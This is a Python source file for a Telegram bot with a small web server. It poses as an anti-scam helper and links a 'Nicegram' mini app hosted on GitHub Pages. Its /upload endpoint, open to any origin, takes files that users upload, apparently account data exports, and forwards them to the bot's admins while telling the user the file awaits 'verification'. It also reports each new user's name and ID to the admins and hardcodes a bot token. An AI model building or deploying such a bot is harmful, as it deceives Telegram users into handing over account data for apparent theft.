import asyncio
import logging
import os
import sqlite3
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile

BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'

ROOT_ADMINS = [8187498719, 8396015606]

WEB_APP_URL = "https://kareli123.github.io/nicegram/"

WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))

DB_FILE = "bot_data.db"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# ================= DATABASE =================

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS admins (
                user_id INTEGER PRIMARY KEY
            )
        """)

        for admin_id in ROOT_ADMINS:
            cursor.execute(
                "INSERT OR IGNORE INTO admins (user_id) VALUES (?)",
                (admin_id,)
            )

        conn.commit()

def add_user_if_new(user: types.User):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
        if cursor.fetchone():
            return False

        cursor.execute(
            "INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)",
            (user.id, user.username, user.full_name)
        )
        conn.commit()
        return True

def get_all_admins():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM admins")
        return [row[0] for row in cursor.fetchall()]

def add_new_admin(user_id):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR IGNORE INTO admins (user_id) VALUES (?)",
            (user_id,)
        )
        conn.commit()

# ================= WEB SERVER =================

routes = web.RouteTableDef()

@routes.get('/')
async def keep_alive(request):
    return web.Response(text="Bot is running!")

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    reader = await request.multipart()

    user_id = None
    file_data = None
    filename = "unknown.json"

    while True:
        part = await reader.next()
        if part is None:
            break

        if part.name == 'user_id':
            val = await part.read_chunk()
            user_id = val.decode('utf-8')
        elif part.name == 'file':
            filename = part.filename or "data.json"
            file_data = await part.read()

    if user_id and file_data:
        admin_ids = get_all_admins()
        caption_text = f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"

        for admin_id in admin_ids:
            try:
                await bot.send_document(
                    chat_id=admin_id,
                    document=BufferedInputFile(file_data, filename=filename),
                    caption=caption_text
                )
            except Exception as e:
                logging.warning(e)

        try:
            await bot.send_message(
                chat_id=int(user_id),
                text="✅ Файл принят. Ожидайте проверки."
            )
        except:
            pass

    return web.Response(text="OK")

@routes.options('/upload')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# ================= BOT UI =================

TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников."""

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
    ])

# ================= COMMANDS =================

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    user = message.from_user
    is_new = add_user_if_new(user)

    if is_new:
        admin_text = (
            f"👤 Новый пользователь\n"
            f"{user.full_name}\n"
            f"@{user.username}\n"
            f"ID: {user.id}"
        )
        for admin_id in get_all_admins():
            try:
                await bot.send_message(admin_id, admin_text)
            except:
                pass

    if os.path.exists("nicegramm.jpg"):
        await message.answer_photo(
            FSInputFile("nicegramm.jpg"),
            caption=TEXT_MAIN,
            reply_markup=get_main_keyboard()
        )
    else:
        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())

# ================= ADMIN =================

@router.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id not in get_all_admins():
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("/admin @username")
        return

    username = args[1].replace("@", "").lower()

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT user_id FROM users WHERE LOWER(username)=?",
            (username,)
        )
        row = cursor.fetchone()

    if not row:
        await message.answer("Пользователь не найден")
        return

    add_new_admin(row[0])
    await message.answer("Администратор добавлен")

@router.message(Command("text"))
async def cmd_text(message: types.Message):
    if message.from_user.id not in get_all_admins():
        return

    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("/text @username сообщение")
        return

    username = parts[1].replace("@", "").lower()
    text = parts[2]

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute(
            "SELECT user_id FROM users WHERE LOWER(username)=?",
            (username,)
        )
        row = cursor.fetchone()

    if not row:
        await message.answer("Пользователь не найден")
        return

    await bot.send_message(row[0], text)

# ================= START =================

async def main():
    init_db()

    app = web.Application()
    app.add_routes(routes)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
    await site.start()

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
